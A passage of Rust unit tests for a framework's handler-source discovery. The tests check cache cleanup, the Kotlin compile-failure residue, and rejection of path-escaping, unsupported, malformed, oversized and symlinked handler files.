        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/workers/handler.cs",
            b"sealed class Handler { public static object GET() => new { }; }\n",
        );
        discover_twice_at_once(root.path(), "server/workers/handler.cs");
        let cache = root.path().join(".tachyon/handlers");
        assert_cache_within_bounds(&cache);
        assert!(has_no_temporary_entries(&cache));
    }

    #[test]
    fn failed_compilation_leaves_no_attempt_source_or_artifact() {
        if !command_succeeds("kotlinc", "-version") {
            return;
        }
        let root = tempfile::tempdir().expect("project");
        write(
            root.path(),
            "server/workers/handler.kt",
            b"object Handler { @JvmStatic fun GET(): Any? = missingValue }",
        );
        HandlerSource::discover(root.path(), "server/workers/handler.kt")
            .expect_err("invalid Kotlin must fail compilation");
        let cache = root.path().join(".tachyon/handlers");
        let residue: Vec<_> = fs::read_dir(cache)
            .expect("cache")
            .flatten()
            .filter(|entry| entry.file_name().to_string_lossy().contains("tmp"))
            .collect();
        assert!(residue.is_empty(), "{residue:?}");
    }

    #[test]
    fn unsafe_unsupported_and_malformed_sources_fail_closed() {
        let large = vec![b'x'; 1024 * 1024 + 1];
        for (path, contents, code) in [
            ("../yon.py", None, "TY2002"),
            ("client/pages/yon.py", None, "TY2002"),
            (
                "server/workers/handler.pl",
                Some(b"handler".as_slice()),
                "TY2003",
            ),
            ("server/workers/missing.py", None, "TY2001"),
            (
                "server/workers/contains_nul.py",
                Some(b"class\0 Handler".as_slice()),
                "TY2004",
            ),
            (
                "server/workers/bytes.js",
                Some([0xff, 0xfe].as_slice()),
                "TY2004",
            ),
            ("server/workers/large.py", Some(large.as_slice()), "TY2004"),
        ] {
            let root = tempfile::tempdir().expect("isolated malformed source project");
            if let Some(contents) = contents {
                write(root.path(), path, contents);
            }
            let failure = HandlerSource::discover(root.path(), path).expect_err(path);
            assert!(failure.to_string().contains(code), "{path}: {failure}");
        }
    }

    #[cfg(unix)]
    #[test]
    fn symlinked_handler_paths_are_rejected() {
        use std::os::unix::fs::symlink;

        let root = tempfile::tempdir().expect("project");
        write(root.path(), "outside.py", b"class Handler: pass");
        fs::create_dir_all(root.path().join("server/workers")).expect("workers");
        symlink(
            root.path().join("outside.py"),
            root.path().join("server/workers/handler.py"),
        )
        .expect("symlink");
        let failure =
            HandlerSource::discover(root.path(), "server/workers/handler.py").expect_err("symlink");
        assert!(failure.to_string().contains("TY2004"));
    }
}
